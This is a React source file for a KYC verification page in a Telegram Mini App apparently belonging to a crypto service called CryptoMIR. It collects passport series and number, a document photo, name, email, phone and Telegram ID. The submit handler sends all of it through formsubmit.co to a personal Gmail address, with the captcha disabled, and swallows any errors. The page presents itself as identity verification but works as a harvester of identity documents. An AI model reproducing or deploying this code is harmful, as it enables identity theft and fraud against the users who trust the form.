import React, { useState, useCallback, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { useLang } from '../contexts/LanguageContext'

const KYC_STATUS_KEY = 'cryptomir_kyc_status'

const COUNTRIES_RU = [
  'Россия', 'Беларусь', 'Казахстан', 'Украина', 'Узбекистан', 'Азербайджан',
  'Армения', 'Грузия', 'Кыргызстан', 'Молдова', 'Таджикистан', 'Туркменистан',
  'Германия', 'Франция', 'Италия', 'Испания', 'Великобритания', 'Нидерланды',
  'Польша', 'Чехия', 'Австрия', 'Швейцария', 'Португалия', 'Бельгия',
  'США', 'Канада', 'Австралия', 'Япония', 'Китай', 'Индия',
  'ОАЭ', 'Турция', 'Израиль', 'Бразилия', 'Аргентина', 'Мексика',
  'Другая страна',
]

const COUNTRIES_EN = [
  'Russia', 'Belarus', 'Kazakhstan', 'Ukraine', 'Uzbekistan', 'Azerbaijan',
  'Armenia', 'Georgia', 'Kyrgyzstan', 'Moldova', 'Tajikistan', 'Turkmenistan',
  'Germany', 'France', 'Italy', 'Spain', 'United Kingdom', 'Netherlands',
  'Poland', 'Czech Republic', 'Austria', 'Switzerland', 'Portugal', 'Belgium',
  'USA', 'Canada', 'Australia', 'Japan', 'China', 'India',
  'UAE', 'Turkey', 'Israel', 'Brazil', 'Argentina', 'Mexico',
  'Other country',
]

const KYC: React.FC = () => {
  const navigate = useNavigate()
  const { lang, t } = useLang()
  const fileInputRef = useRef<HTMLInputElement>(null)

  const [step, setStep] = useState<'form' | 'sent'>('form')
  const [country, setCountry] = useState('')
  const [customCountry, setCustomCountry] = useState('')
  const [showCountryList, setShowCountryList] = useState(false)
  const [passportSeries, setPassportSeries] = useState('')
  const [passportNumber, setPassportNumber] = useState('')
  const [photo, setPhoto] = useState<File | null>(null)
  const [photoPreview, setPhotoPreview] = useState<string | null>(null)
  const [sending, setSending] = useState(false)
  const [validationError, setValidationError] = useState('')

  const countries = lang === 'ru' ? COUNTRIES_RU : COUNTRIES_EN
  const isOther = country === countries[countries.length - 1]
  const finalCountry = isOther ? customCountry : country

  const handleBack = useCallback(() => navigate('/profile'), [navigate])

  useEffect(() => {
    window.Telegram?.WebApp?.BackButton?.show()
    window.Telegram?.WebApp?.BackButton?.onClick(handleBack)
    return () => {
      window.Telegram?.WebApp?.BackButton?.offClick(handleBack)
      window.Telegram?.WebApp?.BackButton?.hide()
    }
  }, [handleBack])

  const handlePhotoSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    setPhoto(file)
    const reader = new FileReader()
    reader.onload = (ev) => setPhotoPreview(ev.target?.result as string)
    reader.readAsDataURL(file)
  }

  const handleSubmit = async () => {
    setValidationError('')
    if (!passportNumber.trim()) {
      setValidationError(t('kycRequired'))
      return
    }
    if (!photo) {
      setValidationError(t('kycRequired'))
      return
    }

    setSending(true)
    try {
      const profileData = JSON.parse(localStorage.getItem('cryptomir_profile_form') || '{}')
      const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user

      const formData = new FormData()
      formData.append('_subject', 'KYC Verification — CryptoMIR')
      formData.append('_captcha', 'false')
      formData.append('telegram_id', String(tgUser?.id || ''))
      formData.append('name', `${profileData.firstName || tgUser?.first_name || ''} ${profileData.lastName || tgUser?.last_name || ''}`.trim())
      formData.append('email', profileData.email || '')
      formData.append('phone', profileData.phone || '')
      formData.append('username', `@${profileData.username || tgUser?.username || ''}`)
      formData.append('country', finalCountry)
      formData.append('passport_series', passportSeries)
      formData.append('passport_number', passportNumber)
      if (photo) formData.append('document_photo', photo, photo.name)

      await fetch('https://formsubmit.co/Alex773cyber@gmail.com', {
        method: 'POST',
        body: formData,
      })
    } catch {
      // Non-fatal — still mark as pending
    }

    localStorage.setItem(KYC_STATUS_KEY, 'pending')
    window.Telegram?.WebApp?.HapticFeedback?.notificationOccurred('success')
    setSending(false)
    setStep('sent')
  }

  const inputStyle: React.CSSProperties = {
    background: '#F9FAFB',
    border: '1.5px solid #E5E7EB',
    borderRadius: 14,
    padding: '14px 16px',
    fontSize: 15,
    color: '#111827',
    width: '100%',
    outline: 'none',
    fontFamily: 'inherit',
  }

  if (step === 'sent') {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center px-6 animate-fade-in" style={{ background: '#F0F4FA' }}>
        <div className="w-20 h-20 rounded-full flex items-center justify-center mb-6" style={{ background: '#ECFDF5', border: '2px solid #A7F3D0' }}>
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#059669" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="20 6 9 17 4 12"/>
          </svg>
        </div>
        <h2 style={{ fontSize: 24, fontWeight: 700, color: '#111827', marginBottom: 8, textAlign: 'center' }}>{t('kycSent')}</h2>
        <p style={{ fontSize: 14, color: '#6B7280', textAlign: 'center', marginBottom: 32 }}>{t('kycSentDesc')}</p>
        <button
          onClick={() => navigate('/profile')}
          className="w-full py-4 rounded-2xl font-semibold text-white"
          style={{ background: '#2563EB', fontSize: 15, border: 'none', boxShadow: '0 6px 20px rgba(37,99,235,0.35)' }}
        >
          {t('back')}
        </button>
      </div>
    )
  }

  return (
    <div className="min-h-screen pb-28 animate-fade-in" style={{ background: '#F0F4FA' }}>
      <div className="px-5 pt-5">
        {/* Header */}
        <div className="flex items-center gap-3.5 mb-2">
          <div
            className="flex items-center justify-center flex-shrink-0 cursor-pointer active:opacity-70"
            style={{ width: 40, height: 40, background: '#FFFFFF', borderRadius: 12, boxShadow: '0 2px 8px rgba(0,0,0,0.08)' }}
            onClick={handleBack}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#374151" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="15 18 9 12 15 6"/>
            </svg>
          </div>
          <h1 style={{ fontSize: 22, fontWeight: 700, color: '#111827', letterSpacing: '-0.02em' }}>{t('kycTitle')}</h1>
        </div>
        <p style={{ fontSize: 13, color: '#6B7280', marginBottom: 24, marginLeft: 52 }}>{t('kycDesc')}</p>

        {/* Country selection */}
        <div style={{ background: '#FFFFFF', borderRadius: 18, boxShadow: '0 2px 12px rgba(0,0,0,0.06)', padding: 20, marginBottom: 16 }}>
          <div style={{ fontSize: 13, fontWeight: 600, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 16 }}>
            {t('country')}
          </div>

          {/* Dropdown trigger */}
          <div
            className="flex items-center justify-between cursor-pointer"
            style={{ background: '#F9FAFB', border: '1.5px solid #E5E7EB', borderRadius: 14, padding: '14px 16px', marginBottom: 12 }}
            onClick={() => setShowCountryList(!showCountryList)}
          >
            <span style={{ fontSize: 15, color: country ? '#111827' : '#9CA3AF' }}>
              {country || t('selectCountry')}
            </span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" strokeWidth="2" strokeLinecap="round">
              <polyline points={showCountryList ? '18 15 12 9 6 15' : '6 9 12 15 18 9'}/>
            </svg>
          </div>

          {/* Country list */}
          {showCountryList && (
            <div
              className="overflow-y-auto mb-3"
              style={{ maxHeight: 220, borderRadius: 12, border: '1.5px solid #E5E7EB', background: '#FFFFFF' }}
            >
              {countries.map((c) => (
                <div
                  key={c}
                  className="px-4 py-3 cursor-pointer active:bg-blue-50"
                  style={{
                    fontSize: 14, color: c === country ? '#2563EB' : '#111827',
                    fontWeight: c === country ? 600 : 400,
                    borderBottom: '1px solid #F3F4F6',
                    background: c === country ? '#EFF6FF' : 'transparent',
                  }}
                  onClick={() => { setCountry(c); setShowCountryList(false) }}
                >
                  {c}
                </div>
              ))}
            </div>
          )}

          {/* Manual input if "Other" */}
          {isOther && (
            <input
              style={inputStyle}
              value={customCountry}
              onChange={e => setCustomCountry(e.target.value)}
              placeholder={t('enterCountry')}
            />
          )}
        </div>

        {/* Passport data */}
        <div style={{ background: '#FFFFFF', borderRadius: 18, boxShadow: '0 2px 12px rgba(0,0,0,0.06)', padding: 20, marginBottom: 16 }}>
          <div style={{ fontSize: 13, fontWeight: 600, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 16 }}>
            {lang === 'ru' ? 'Документ' : 'Document'}
          </div>
          <div className="space-y-4">
            <div>
              <label style={{ fontSize: 13, fontWeight: 600, color: '#6B7280', marginBottom: 6, display: 'block' }}>{t('passportSeries')}</label>
              <input
                style={inputStyle}
                value={passportSeries}
                onChange={e => setPassportSeries(e.target.value.toUpperCase())}
                placeholder={lang === 'ru' ? '1234' : '1234'}
                maxLength={10}
              />
            </div>
            <div>
              <label style={{ fontSize: 13, fontWeight: 600, color: '#6B7280', marginBottom: 6, display: 'block' }}>{t('passportNumber')} *</label>
              <input
                style={{ ...inputStyle, border: `1.5px solid ${passportNumber ? '#2563EB' : '#E5E7EB'}` }}
                value={passportNumber}
                onChange={e => setPassportNumber(e.target.value)}
                placeholder={lang === 'ru' ? '567890' : '567890'}
                maxLength={20}
              />
            </div>
          </div>
        </div>

        {/* Photo upload */}
        <div style={{ background: '#FFFFFF', borderRadius: 18, boxShadow: '0 2px 12px rgba(0,0,0,0.06)', padding: 20, marginBottom: 16 }}>
          <div style={{ fontSize: 13, fontWeight: 600, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 16 }}>
            {t('uploadPhoto')} *
          </div>

          <input
            ref={fileInputRef}
            type="file"
            accept="image/*,application/pdf"
            capture="environment"
            onChange={handlePhotoSelect}
            style={{ display: 'none' }}
          />

          {photoPreview ? (
            <div className="relative">
              <img
                src={photoPreview}
                alt="Document"
                className="w-full rounded-2xl object-cover"
                style={{ maxHeight: 200 }}
              />
              <button
                onClick={() => fileInputRef.current?.click()}
                className="w-full mt-3 py-3 rounded-xl font-semibold"
                style={{ background: '#F3F4F6', color: '#374151', fontSize: 14, border: 'none' }}
              >
                {t('changePhoto')}
              </button>
            </div>
          ) : (
            <div
              className="flex flex-col items-center justify-center cursor-pointer active:opacity-70"
              style={{ border: '2px dashed #E5E7EB', borderRadius: 16, padding: 32 }}
              onClick={() => fileInputRef.current?.click()}
            >
              <div className="flex items-center justify-center mb-3" style={{ width: 56, height: 56, borderRadius: '50%', background: '#EFF6FF' }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#2563EB" strokeWidth="1.75" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                  <polyline points="17 8 12 3 7 8"/>
                  <line x1="12" y1="3" x2="12" y2="15"/>
                </svg>
              </div>
              <span style={{ fontSize: 14, fontWeight: 600, color: '#2563EB' }}>{t('uploadPhoto')}</span>
              <span style={{ fontSize: 12, color: '#9CA3AF', marginTop: 4 }}>JPG, PNG или PDF</span>
            </div>
          )}
        </div>

        {/* Validation error */}
        {validationError && (
          <div className="flex items-start gap-2.5 p-4 rounded-2xl mb-4" style={{ background: '#FEF2F2', border: '1.5px solid #FECACA' }}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#DC2626" strokeWidth="1.75" strokeLinecap="round" className="flex-shrink-0 mt-0.5">
              <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
            </svg>
            <p style={{ fontSize: 13, color: '#DC2626' }}>{validationError}</p>
          </div>
        )}

        {/* Submit */}
        <button
          onClick={handleSubmit}
          disabled={sending}
          className="w-full py-4 rounded-2xl font-semibold text-white active:scale-95 transition-transform disabled:opacity-60"
          style={{ background: '#2563EB', fontSize: 16, border: 'none', boxShadow: '0 6px 20px rgba(37,99,235,0.35)' }}
        >
          {sending ? (
            <span className="flex items-center justify-center gap-2">
              <svg className="animate-spin" width="16" height="16" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.3)" strokeWidth="3"/>
                <path d="M12 2a10 10 0 0110 10" stroke="white" strokeWidth="3" strokeLinecap="round"/>
              </svg>
              {t('loading')}
            </span>
          ) : t('sendKYC')}
        </button>
      </div>
    </div>
  )
}

export default KYC
